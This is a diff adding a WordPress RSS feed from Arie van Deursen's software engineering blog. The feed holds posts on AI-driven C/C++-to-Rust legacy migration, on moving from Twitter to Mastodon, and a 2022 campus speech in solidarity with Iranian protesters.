@@ -1,0 +1,1218 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	xmlns:georss="http://www.georss.org/georss" xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#" xmlns:media="http://search.yahoo.com/mrss/"
+	>
+
+<channel>
+	<title>Arie van Deursen</title>
+	<atom:link href="https://avandeursen.com/feed/" rel="self" type="application/rss+xml" />
+	<link>https://avandeursen.com</link>
+	<description>Software engineering in theory and practice</description>
+	<lastBuildDate>Sat, 27 Dec 2025 11:15:02 +0000</lastBuildDate>
+	<language>en</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>http://wordpress.com/</generator>
+<site xmlns="com-wordpress:feed-additions:1">37539060</site><cloud domain='avandeursen.com' port='80' path='/?rsscloud=notify' registerProcedure='' protocol='http-post' />
+<image>
+		<url>https://s0.wp.com/i/buttonw-com.png</url>
+		<title>Arie van Deursen</title>
+		<link>https://avandeursen.com</link>
+	</image>
+	<atom:link rel="search" type="application/opensearchdescription+xml" href="https://avandeursen.com/osd.xml" title="Arie van Deursen" />
+	<atom:link rel='hub' href='https://avandeursen.com/?pushpress=hub'/>
+	<item>
+		<title>Migrating Legacy Like a North Star Engineer</title>
+		<link>https://avandeursen.com/2025/12/24/migrating-legacy-like-a-north-star-engineer/</link>
+					<comments>https://avandeursen.com/2025/12/24/migrating-legacy-like-a-north-star-engineer/#respond</comments>
+		
+		<dc:creator><![CDATA[Arie van Deursen]]></dc:creator>
+		<pubDate>Wed, 24 Dec 2025 10:45:12 +0000</pubDate>
+				<category><![CDATA[Society]]></category>
+		<category><![CDATA[legacy]]></category>
+		<category><![CDATA[software architecture]]></category>
+		<guid isPermaLink="false">http://avandeursen.com/?p=1628</guid>
+
+					<description><![CDATA[Microsoft wishes to get rid of a billion lines of C/C++ code. They target a rewrite to Rust by 2030, according to a recently posted job ad. Betting on AI, their &#8220;North Star&#8221; is: 1 engineer, 1 month, 1 million lines of code. I admire the bold ambition, turning legacy modernization into the pinnacle of [&#8230;]]]></description>
+										<content:encoded><![CDATA[<div class="wp-block-image">
+<figure class="alignright size-large is-resized"><a href="https://avandeursen.com/wp-content/uploads/2025/12/bxnord-1.jpg"><img width="340" height="540" data-attachment-id="1632" data-permalink="https://avandeursen.com/2025/12/24/migrating-legacy-like-a-north-star-engineer/bxnord-2/#main" data-orig-file="https://avandeursen.com/wp-content/uploads/2025/12/bxnord-1.jpg" data-orig-size="340,540" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="bxnord" data-image-description="" data-image-caption="" data-medium-file="https://avandeursen.com/wp-content/uploads/2025/12/bxnord-1.jpg?w=189" data-large-file="https://avandeursen.com/wp-content/uploads/2025/12/bxnord-1.jpg?w=340" src="https://avandeursen.com/wp-content/uploads/2025/12/bxnord-1.jpg?w=340" alt="" class="wp-image-1632" style="width:244px;height:auto" srcset="https://avandeursen.com/wp-content/uploads/2025/12/bxnord-1.jpg 340w, https://avandeursen.com/wp-content/uploads/2025/12/bxnord-1.jpg?w=94 94w, https://avandeursen.com/wp-content/uploads/2025/12/bxnord-1.jpg?w=189 189w" sizes="(max-width: 340px) 100vw, 340px" /></a></figure>
+</div>
+
+
+<p>Microsoft wishes to get rid of a billion lines of C/C++ code. They target a rewrite to Rust by 2030, according to a recently posted <a href="http://[li]: https://www.linkedin.com/posts/galenh_principal-software-engineer-coreai-microsoft-activity-7407863239289729024-WTzf/">job ad</a>. Betting on AI, their &#8220;North Star&#8221; is:</p>
+
+
+
+<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
+<p class="has-text-align-left"><em><strong>1 engineer, 1 month, 1 million lines of code</strong></em>.</p>
+</blockquote>
+
+
+
+<p>I admire the bold ambition, turning legacy modernization into the pinnacle of engineering excellence.</p>
+
+
+
+<p>It also dangerously naive to suggest that thanks to AI a few engineers can modernize a multi-million line code base in a matter of months. I know too many board members (in government, finance, and other sectors) who would <em>love</em> to believe this suggestion. Legacy is their main headache. What can be more tempting than just waiting a little until the North Star Engineer emerges? And, lo and behold, there will even be vendors promising they can deliver exactly such engineers, together with tools powered by AI magic.</p>
+
+
+
+<p>For board members contemplating to await this north star revolution, here is some advice on things to do without delay:</p>
+
+
+
+<ol class="wp-block-list">
+<li><strong>Disentangle</strong> the legacy landscape. Break dependencies. Ensure the legacy system can be modernized incrementally, component by component.</li>
+
+
+
+<li>Invest in <strong>domain knowledge</strong> and deep understanding of the desired behavior. Ensure any discrepancies between old and new functionality can be interpreted correctly.</li>
+
+
+
+<li>Invest in an idiomatic, <strong>uniform code base</strong>. The less variability, the easier any (automated) translation will be.</li>
+
+
+
+<li>Invest in <strong>testing</strong>. Boost the automated test suites so that they exercise all key business logic. As the legacy system delivers mostly correct functionality, use it to (automatically) derive test suites achieving high coverage (which can subsequently be used to test migrated components).</li>
+
+
+
+<li>Bring the legacy system in a state in which it is possible to <strong>deploy old and new versions of a component in parallel</strong>, and results can be compared.</li>
+</ol>
+
+
+
+<p>None of these steps do any actual translation. They are, however, the starting point from which translation can be attempted. They bring the legacy system in a more manageable state, in which the risks of the migration can be mitigated by an incremental approach focused on gradual replacement and continuous feedback on correctness.</p>
+
+
+
+<p>For some of these steps, program analysis tools and modern AI may help. But there are no free lunches. Each of the steps requires a substantial investment of effort and resources.</p>
+
+
+
+<p>It is safe to assume that Microsoft is well aware of the need for these steps. What&#8217;s more, their systems are likely in relatively good starting position, with high levels of automated testing in place already. But even then, for automated translation to work substantial additional investments will be necessary.</p>
+
+
+
+<p>This brings us back to the board members of &#8216;normal&#8217; legacy-owning organizations.<br>Perhaps Microsoft can pull off some North Star Engineering magic. But for the legacy code that runs our taxes, payments and social security, it won&#8217;t make a difference. The legacy systems that run our society need continuous attention and investment, starting now, to ensure they stay ready for the decades ahead.</p>
+
+
+
+<hr class="wp-block-separator has-alpha-channel-opacity" />
+
+
+
+<p><strong>The Original Post</strong></p>
+
+
+
+<p>Galen Hunt, December 20, 2025.</p>
+
+
+
+<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
+<p>I have an open position in my team for a IC5 Principal Software Engineer. The position is in-person in Redmond.</p>
+
+
+
+<p>My goal is to eliminate every line of C and C++ from Microsoft by 2030. Our strategy is to combine AI <em>and</em> Algorithms to rewrite Microsoft’s largest codebases. Our North Star is “1 engineer, 1 month, 1 million lines of code”. To accomplish this previously unimaginable task, we’ve built a powerful code processing infrastructure. Our algorithmic infrastructure creates a scalable graph over source code at scale. Our AI processing infrastructure then enables us to apply AI agents, guided by algorithms, to make code modifications at scale. The core of this infrastructure is already operating at scale on problems such as code understanding.</p>
+
+
+
+<p>The purpose of this Principal Software Engineer role is to help us evolve and augment our infrastructure to enable translating Microsoft’s largest C and C++ systems to Rust. A critical requirement for this role is experience building production quality systems-level code in Rust—preferably at least 3 years of experience writing systems-level code in Rust. Compiler, database, or OS implementation experience is highly desired. While compiler implementation experience is not required to apply, the willingness to acquire that experience in our team is required.</p>
+
+
+
+<p>Our team is driven by a growth mindset. We are diverse team with a wide range of skills and perspectives. We take on bold risks. We work and play well with others. We love to bring value to internal and external customers. We have learned that our diversity and growth mindset is critical to success in the rapidly changing word of AI-based tools.</p>
+
+
+
+<p>Our team is part of the Future of Scalable Software Engineering group in the EngHorizons organization in Microsoft CoreAI. Our mission is to build capabilities to allow Microsoft and our customers to eliminate technical debt at scale. We pioneer new tools and techniques with internal customers and partners, and then work with other product groups to deploy those capabilities at scale across Microsoft and across the industry.</p>
+</blockquote>
+
+
+
+<hr class="wp-block-separator has-alpha-channel-opacity" />
+
+
+
+<p>Four days after posting, Galen Hunt placed an update:</p>
+
+
+
+<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
+<p>Update:<br>It appears my post generated far more attention than I intended… with a lot of speculative reading between the lines.</p>
+
+
+
+<p>Just to clarify… Windows is <em>NOT</em> being rewritten in Rust with AI.</p>
+
+
+
+<p>My team’s project is a research project. We are building tech to make migration from language to language possible. The intent of my post was to find like-minded engineers to join us on the next stage of this multi-year endeavor—not to set a new strategy for Windows 11+ or to imply that Rust is an endpoint.</p>
+</blockquote>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://avandeursen.com/2025/12/24/migrating-legacy-like-a-north-star-engineer/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">1628</post-id>
+		<media:thumbnail url="https://avandeursen.com/wp-content/uploads/2025/12/img_2133.jpg" />
+		<media:content url="https://avandeursen.com/wp-content/uploads/2025/12/img_2133.jpg" medium="image">
+			<media:title type="html">IMG_2133</media:title>
+		</media:content>
+
+		<media:content url="https://2.gravatar.com/avatar/ef31012d0a49cad89443a15b6cbec6a9a27c1e8f5ebfa8c1b47ecf83f83fc3aa?s=96&#38;d=identicon&#38;r=G" medium="image">
+			<media:title type="html">avandeursen</media:title>
+		</media:content>
+
+		<media:content url="https://avandeursen.com/wp-content/uploads/2025/12/bxnord-1.jpg?w=340" medium="image" />
+	</item>
+		<item>
+		<title>Exit Twitter. Enter Mastodon?</title>
+		<link>https://avandeursen.com/2023/08/20/exit-twitter-enter-mastodon/</link>
+					<comments>https://avandeursen.com/2023/08/20/exit-twitter-enter-mastodon/#comments</comments>
+		
+		<dc:creator><![CDATA[Arie van Deursen]]></dc:creator>
+		<pubDate>Sun, 20 Aug 2023 13:22:36 +0000</pubDate>
+				<category><![CDATA[Research]]></category>
+		<category><![CDATA[mastodon]]></category>
+		<category><![CDATA[social media]]></category>
+		<category><![CDATA[twitter]]></category>
+		<guid isPermaLink="false">http://avandeursen.com/?p=1584</guid>
+
+					<description><![CDATA[... it is unavoidable that I take a step back in my Twitter presence. Platform X doesn’t deserve my carefully worded tweets. As an alternative, I have been exploring Mastodon during the last 12 months. It’s not perfect, but ...]]></description>
+										<content:encoded><![CDATA[
+<div class="wp-block-jetpack-markdown"><p>I used to love Twitter. It was in 2009 that I joined it as <a href="https://twitter.com/avandeursen">@avandeursen</a>. I mostly used it for work, to share and discuss research and education in software engineering. Looking back, this is what I liked best about Twitter:</p>
+<ol>
+<li>It allowed me to connect to people who shared similar interests, even if I had never met them before;</li>
+<li>It gave me a platform to share my views on current developments in my research area with thousands of people</li>
+<li>It helped me stay current</li>
+</ol>
+<p>Unfortunately, I find it harder and harder to stay excited about Twitter:</p>
+<ol>
+<li>Human dignity is increasingly under attack at Twitter, making it a platform of harassment and mis-information. Mechanisms to handle this, such as moderation or ability to block, have been weakened instead of strengthened.</li>
+<li>The owner of Twitter exhibits erratic and irrational behavior, thereby normalizing it.</li>
+<li>Twitter randomly blocks or delays sources of useful information (e.g., Mastodon, New York Times), thereby making Twitter itself less useful.</li>
+<li>Access to tweets has been limited: Now, they are only visible when logged in into Twitter, and older tweets (before 2014) are lost. To me tweeting is a form of (micro-)publishing, so hiding tweets defeats the purpose.</li>
+</ol>
+<p>Thus, it is unavoidable that I take a step back in my Twitter presence. Platform X doesn’t deserve my carefully worded tweets.</p>
+<p>As an alternative, I have been exploring Mastodon during the last 12 months. It’s not perfect, but there are a few things to like about it.</p>
+<p>For one, it is entirely <em>open</em>, being based on the open <a href="https://www.w3.org/TR/activitypub/">ActivityPub</a> protocol, and running on open source software. Naturally, my posts are open too, openly visible to anyone, even those without a Mastodon account.</p>
+<p>Furthermore, it is <em>federated</em>, meaning it is a collection of micro-blogging servers that exchange messages with each other. This has interesting consequences:</p>
+<ol>
+<li>There is no single owner of Mastodon (or the broader <a href="https://en.wikipedia.org/wiki/Fediverse">Fediverse</a> of all ActivityPub-compliant servers). Billionaires can’t buy it.</li>
+<li>As a user, you can select a server to join, for example a server on your favorite hobby. While this sounds easy, in practice finding a meaningful server to join isn’t always easy (and a potential road block to joining – see also below).</li>
+<li>The server owners are responsible for formulating and enforcing an anti-harrassment policy, which is another factor in selecting a suitable server. Server admins can also block entire other servers if they consider the posts on such a server incompatible with their own code of conduct.</li>
+</ol>
+<p>My own journey started a year ago on <a href="https://mastodon.social/@avandeursen">mastodon.social</a>. I picked this server as it was the first and largest Mastodon server (300,000 users at the time of writing). I soon found a few friends who were active on the smaller <a href="https://fediscience.org/@avandeursen">fediscience.org</a> with around 2,000 users to date. I therefore moved to this server, and have been there for the last 10 months.</p>
+<p>In that period I shared around 250 posts, and built up a network of 300-400 people. While these numbers are small compared to Twitter (where I had over 4,000 followers), I find the engagement more meaningful and more pleasant. Mastodon very much reminds me of Twitter in its early days, when everyone did their best to get the most out of this exciting new technology.</p>
+<p>Recently I have moved my Mastodon account to the <a href="https://mastodon.acm.org/@avandeursen">mastodon.acm.org</a> instance. The nice thing about Mastodon is that such moves are transparent to your followers: They automatically follow your new account instead of your old one if you decide to move. The new instance I picked wasn’t around yet when I originally joined Mastodon. It is hosted by the Association for Computing Machinery (ACM), and has around 250 users at the moment. The server is <em>intended to provide a trustworthy space for computing professionals from around the world to connect and engage with each other in a meaningful way</em>  – which sounds spot on for me.</p>
+<p>As a computing professional, I am a (paying) member of the ACM. I am very happy to see that ACM offers this service, including moderating content to enforce the <a href="https://mastodon.acm.org/about">server rules</a> to be “<em><strong>professional, respectful, inclusive, accessible, honest, and friendly</strong></em>”. Anyone interested in computing can join: I sure hope to see you there!</p>
+</div>
+
+
+<div class="wp-block-image">
+<figure class="aligncenter size-large"><a href="https://mastodon.acm.org/@avandeursen"><img width="1024" height="876" data-attachment-id="1596" data-permalink="https://avandeursen.com/2023/08/20/exit-twitter-enter-mastodon/screenshot-2023-08-20-at-13-18-48/#main" data-orig-file="https://avandeursen.com/wp-content/uploads/2023/08/screenshot-2023-08-20-at-13.18.48.png" data-orig-size="1124,962" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screenshot-2023-08-20-at-13.18.48" data-image-description="" data-image-caption="" data-medium-file="https://avandeursen.com/wp-content/uploads/2023/08/screenshot-2023-08-20-at-13.18.48.png?w=300" data-large-file="https://avandeursen.com/wp-content/uploads/2023/08/screenshot-2023-08-20-at-13.18.48.png?w=640" src="https://avandeursen.com/wp-content/uploads/2023/08/screenshot-2023-08-20-at-13.18.48.png?w=1024" alt="" class="wp-image-1596" srcset="https://avandeursen.com/wp-content/uploads/2023/08/screenshot-2023-08-20-at-13.18.48.png?w=1024 1024w, https://avandeursen.com/wp-content/uploads/2023/08/screenshot-2023-08-20-at-13.18.48.png?w=150 150w, https://avandeursen.com/wp-content/uploads/2023/08/screenshot-2023-08-20-at-13.18.48.png?w=300 300w, https://avandeursen.com/wp-content/uploads/2023/08/screenshot-2023-08-20-at-13.18.48.png?w=768 768w, https://avandeursen.com/wp-content/uploads/2023/08/screenshot-2023-08-20-at-13.18.48.png 1124w" sizes="(max-width: 1024px) 100vw, 1024px" /></a></figure>
+</div>]]></content:encoded>
+					
+					<wfw:commentRss>https://avandeursen.com/2023/08/20/exit-twitter-enter-mastodon/feed/</wfw:commentRss>
+			<slash:comments>1</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">1584</post-id>
+		<media:thumbnail url="https://avandeursen.com/wp-content/uploads/2023/08/screenshot-2023-08-20-at-13.18.48.png" />
+		<media:content url="https://avandeursen.com/wp-content/uploads/2023/08/screenshot-2023-08-20-at-13.18.48.png" medium="image">
+			<media:title type="html">screenshot-2023-08-20-at-13.18.48</media:title>
+		</media:content>
+
+		<media:content url="https://2.gravatar.com/avatar/ef31012d0a49cad89443a15b6cbec6a9a27c1e8f5ebfa8c1b47ecf83f83fc3aa?s=96&#38;d=identicon&#38;r=G" medium="image">
+			<media:title type="html">avandeursen</media:title>
+		</media:content>
+
+		<media:content url="https://avandeursen.com/wp-content/uploads/2023/08/screenshot-2023-08-20-at-13.18.48.png?w=1024" medium="image" />
+	</item>
+		<item>
+		<title>Mahsa Jina Amini and Anne Frank: Woman, Life, Freedom</title>
+		<link>https://avandeursen.com/2022/11/30/mahsa-jina-amini-and-anne-frank-woman-life-freedom/</link>
+					<comments>https://avandeursen.com/2022/11/30/mahsa-jina-amini-and-anne-frank-woman-life-freedom/#respond</comments>
+		
+		<dc:creator><![CDATA[Arie van Deursen]]></dc:creator>
+		<pubDate>Wed, 30 Nov 2022 21:23:49 +0000</pubDate>
+				<category><![CDATA[Society]]></category>
+		<category><![CDATA[freedom]]></category>
+		<guid isPermaLink="false">http://avandeursen.com/?p=1550</guid>
+
+					<description><![CDATA[Speech delivered on November 30, 2022, at TU Delft, as part of the Campus Rally for Iran, in which scholars from 227 universities across the world demonstrated for freedom, justice, and democracy in Iran. Dear Friends, Salām! Thank you for the invitation to speak here, which is an honor. My name is Arie, Arie van [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p><em>Speech delivered on November 30, 2022, at TU Delft, as part of the <a href="https://twitter.com/IranianScholars/status/1598487937380917248">Campus Rally for Iran</a>, in which scholars from 227 universities across the world demonstrated for freedom, justice, and democracy in Iran.</em></p>
+
+
+
+<hr class="wp-block-separator has-alpha-channel-opacity" />
+
+
+
+<p>Dear Friends, Salām!</p>
+
+
+
+<p>Thank you for the invitation to speak here, which is an honor. My name is Arie, Arie van Deursen. I am a professor in computer science, and I am head of one of the Computer Science Departments here at TU Delft.</p>
+
+
+
+<p>Computer science, like many other academic disciplines, is highly international. For example, when I saw the list of 135 universities participating in today&#8217;s rally, I recognized many places. I visited or collaborated with scholars from UBC, UVic, Waterloo, Amherst, UC Davis, Stuttgart, Bremen, Milan, Utrecht, and many more.</p>
+
+
+
+<p>The reason is that academia is united as one. As academics, we believe in the free, rational exchange of ideas, to make this world a better place. Such discussion does not take place in isolation, but happens together, among academics from all over the world. Scholars depend on each other. We need each other. This also means that</p>
+
+
+
+<ul class="wp-block-list">
+<li>If academia in one country is suffering, all of academia is suffering;</li>
+
+
+
+<li>If students and professors are assaulted or arrested at one university, all universities feel the pain;</li>
+
+
+
+<li>If, as in Iran right now, academic women, life, and freedom are under attack, all of academia is under attack.</li>
+</ul>
+
+
+
+<p>This is why we stand here today, as scholars from all over the world, in solidarity with the students and scholars in Iran, in their peaceful fight for the freedom of the people of Iran.</p>
+
+
+
+<p>I also stand here as a head of department. Like the rest of academia, the employees of my department, and the students we educate, come from all over the world. These include dozens of incredibly talented and wonderful people from Iran, many of whom are here today.</p>
+
+
+
+<p>I cannot begin to imagine how difficult this period must be for you. You must be deeply concerned about the lives of your loved ones in Iran and the fate of your country. We, your colleagues, your peers, your professors: We think of you and we support you, and we strongly condemn the violence against you. If there is anything we can do to help you, please let us know.</p>
+
+
+
+<p>I personally began to understand the situation in Iran a little better when I started supervising a PhD student from Iran, back in 2005. (Since then I have worked with many, and they have all been marvelous). This first student (Ali Mesbah, now a professor at UBC), defended his thesis in June 2009. As you know, this was an eventful period in Iran, and he, his paranimphs, and many people in the audience wore green wristbands in support of the protests in Iran at that time.</p>
+
+
+<div class="wp-block-image">
+<figure class="alignright size-large is-resized"><a href="https://avandeursen.com/wp-content/uploads/2022/12/persepolis.jpeg"><img data-attachment-id="1559" data-permalink="https://avandeursen.com/2022/11/30/mahsa-jina-amini-and-anne-frank-woman-life-freedom/persepolis/#main" data-orig-file="https://avandeursen.com/wp-content/uploads/2022/12/persepolis.jpeg" data-orig-size="752,1153" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="persepolis" data-image-description="" data-image-caption="" data-medium-file="https://avandeursen.com/wp-content/uploads/2022/12/persepolis.jpeg?w=196" data-large-file="https://avandeursen.com/wp-content/uploads/2022/12/persepolis.jpeg?w=640" src="https://avandeursen.com/wp-content/uploads/2022/12/persepolis.jpeg?w=668" alt="" class="wp-image-1559" width="122" height="187" srcset="https://avandeursen.com/wp-content/uploads/2022/12/persepolis.jpeg?w=122 122w, https://avandeursen.com/wp-content/uploads/2022/12/persepolis.jpeg?w=244 244w, https://avandeursen.com/wp-content/uploads/2022/12/persepolis.jpeg?w=98 98w, https://avandeursen.com/wp-content/uploads/2022/12/persepolis.jpeg?w=196 196w" sizes="(max-width: 122px) 100vw, 122px" /></a></figure>
+</div>
+
+
+<p>A few years later I read Marjane Satrapi&#8217;s beautiful graphic novel Persepolis. I think the book is forbidden in Iran, but my then teenage children had to read it at high school in The Netherlands, which prompted me to read it as well. I was mind blown. Persepolis tells Satrapi&#8217;s story of growing up in the new Islamic Republic: The oppression, the violence, and the balancing act separating your secret private life from what is allowed in public. It is also a story about moving to Europe as an art student, the loneliness this brings, and about how much you can miss your home country. And it is, ultimately, a story about love and family.</p>
+
+
+
+<p>In a <a href="https://www.vogue.com/article/emma-watson-interviews-marjane-satrapi">Vogue interview</a> in 2016 with Emma Watson (of Hermione Granger fame), Marjane Satrapi gave a clear diagnosis of the root cause of Iran&#8217;s current status: <em>&#8220;The enemy of democracy isn’t one person. The enemy of democracy is patriarchal culture.&#8221;</em></p>
+
+
+<div class="wp-block-image">
+<figure class="alignright size-large is-resized"><a href="https://en.wikipedia.org/wiki/Death_of_Mahsa_Amini"><img loading="lazy" data-attachment-id="1567" data-permalink="https://avandeursen.com/2022/11/30/mahsa-jina-amini-and-anne-frank-woman-life-freedom/mahsa_amini-2/#main" data-orig-file="https://avandeursen.com/wp-content/uploads/2022/11/mahsa_amini.jpeg" data-orig-size="289,346" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Mahsa_Amini" data-image-description="" data-image-caption="" data-medium-file="https://avandeursen.com/wp-content/uploads/2022/11/mahsa_amini.jpeg?w=251" data-large-file="https://avandeursen.com/wp-content/uploads/2022/11/mahsa_amini.jpeg?w=289" src="https://avandeursen.com/wp-content/uploads/2022/11/mahsa_amini.jpeg?w=289" alt="" class="wp-image-1567" width="120" height="144" srcset="https://avandeursen.com/wp-content/uploads/2022/11/mahsa_amini.jpeg?w=120 120w, https://avandeursen.com/wp-content/uploads/2022/11/mahsa_amini.jpeg?w=240 240w, https://avandeursen.com/wp-content/uploads/2022/11/mahsa_amini.jpeg?w=125 125w" sizes="(max-width: 120px) 100vw, 120px" /></a></figure>
+</div>
+
+
+<p>For resisting that culture, for fighting the patriarchy, <a href="https://en.wikipedia.org/wiki/Death_of_Mahsa_Amini">Mahsa Jina Amini</a> paid the ultimate price.</p>
+
+
+
+<p>Since then, women and men across Iran have followed her lead, demanding freedom. Hundreds of peaceful protesters have been killed, thousands arrested, and tens of thousands assaulted. Despite that, the struggle for freedom continues. An iconic picture to me is that of two young women, no hijab, who were simply <a href="https://twitter.com/rezahakbari/status/1579489367634366464">offering free hugs</a> in a street in the city of Kermanshah. This is a time when the sad people of Iran just need a hug, they observed.</p>
+
+
+
+<p>They were risking their lives. Their bravery is an inspiration to all of us.</p>
+
+
+
+<p>Therefore, we stand here, and in more than one hundred universities around the world, in strong solidarity with you, to support you, in your demand for justice and freedom.</p>
+
+
+
+<p>Let me conclude with a quote from another strong young woman, Anne Frank. She wrote it in her diary on April 12, 1944, when she was 14 years old. She had spent two years in an attic in Amsterdam, hiding for the German Nazi occupiers of The Netherlands. The day before, their hideout had been discovered by a burglar. They weren&#8217;t arrested yet, but the danger was imminent.</p>
+
+
+
+<p>This is what she wrote. I&#8217;ll read it first in Dutch, and then in English.</p>
+
+
+<div class="wp-block-image">
+<figure class="alignright size-large is-resized"><a href="https://en.wikipedia.org/wiki/Anne_Frank"><img loading="lazy" data-attachment-id="1555" data-permalink="https://avandeursen.com/2022/11/30/mahsa-jina-amini-and-anne-frank-woman-life-freedom/anne_frank_passport_photo_may_1942/#main" data-orig-file="https://avandeursen.com/wp-content/uploads/2022/12/anne_frank_passport_photo_may_1942.jpeg" data-orig-size="440,434" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Anne_Frank_passport_photo,_May_1942" data-image-description="" data-image-caption="" data-medium-file="https://avandeursen.com/wp-content/uploads/2022/12/anne_frank_passport_photo_may_1942.jpeg?w=300" data-large-file="https://avandeursen.com/wp-content/uploads/2022/12/anne_frank_passport_photo_may_1942.jpeg?w=440" src="https://avandeursen.com/wp-content/uploads/2022/12/anne_frank_passport_photo_may_1942.jpeg?w=440" alt="" class="wp-image-1555" width="156" height="153" srcset="https://avandeursen.com/wp-content/uploads/2022/12/anne_frank_passport_photo_may_1942.jpeg?w=156 156w, https://avandeursen.com/wp-content/uploads/2022/12/anne_frank_passport_photo_may_1942.jpeg?w=312 312w, https://avandeursen.com/wp-content/uploads/2022/12/anne_frank_passport_photo_may_1942.jpeg?w=150 150w, https://avandeursen.com/wp-content/uploads/2022/12/anne_frank_passport_photo_may_1942.jpeg?w=300 300w" sizes="(max-width: 156px) 100vw, 156px" /></a></figure>
+</div>
+
+
+<p><em>Ik weet wat ik wil,<br>ik heb een doel; een mening,<br>ik heb een geloof en een liefde.<br>Laat me mezelf zijn, dan ben ik tevreden.<br>Ik weet dat ik een vrouw ben,<br>een vrouw met innerlijke sterkte en veel moed.</em></p>
+
+
+
+<p><em>I know what I want,<br>I have a goal, an opinion,<br>I have a religion and love.<br>Let me be myself and then I am satisfied.<br>I know that I am a woman,<br>a woman with inward strength and plenty of courage.</em></p>
+
+
+
+<p>Woman &#8212; life &#8212; freedom<br>Jin &#8212; Jiyan &#8212; Azadî<br>Jin &#8212; Jiyan &#8212; Azadî</p>
+
+
+
+<p>Thank you very much!</p>
+
+
+
+<hr class="wp-block-separator has-alpha-channel-opacity" />
+
+
+
+<p><em>Arie van Deursen. Delft, November 30, 2022</em></p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://avandeursen.com/2022/11/30/mahsa-jina-amini-and-anne-frank-woman-life-freedom/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">1550</post-id>
+		<media:content url="https://2.gravatar.com/avatar/ef31012d0a49cad89443a15b6cbec6a9a27c1e8f5ebfa8c1b47ecf83f83fc3aa?s=96&#38;d=identicon&#38;r=G" medium="image">
+			<media:title type="html">avandeursen</media:title>
+		</media:content>
+
+		<media:content url="https://avandeursen.com/wp-content/uploads/2022/12/persepolis.jpeg?w=668" medium="image" />
+
+		<media:content url="https://avandeursen.com/wp-content/uploads/2022/11/mahsa_amini.jpeg?w=289" medium="image" />
+
+		<media:content url="https://avandeursen.com/wp-content/uploads/2022/12/anne_frank_passport_photo_may_1942.jpeg?w=440" medium="image" />
+	</item>
+		<item>
+		<title>Member Advisory Council IT Assessment</title>
+		<link>https://avandeursen.com/2022/08/15/member-advisory-council-ict-assessments/</link>
+					<comments>https://avandeursen.com/2022/08/15/member-advisory-council-ict-assessments/#respond</comments>
+		
+		<dc:creator><![CDATA[Arie van Deursen]]></dc:creator>
+		<pubDate>Mon, 15 Aug 2022 11:34:10 +0000</pubDate>
+				<category><![CDATA[Society]]></category>
+		<category><![CDATA[acict]]></category>
+		<category><![CDATA[risk assessments]]></category>
+		<category><![CDATA[software architecture]]></category>
+		<category><![CDATA[software metrics]]></category>
+		<guid isPermaLink="false">http://avandeursen.com/?p=1514</guid>
+
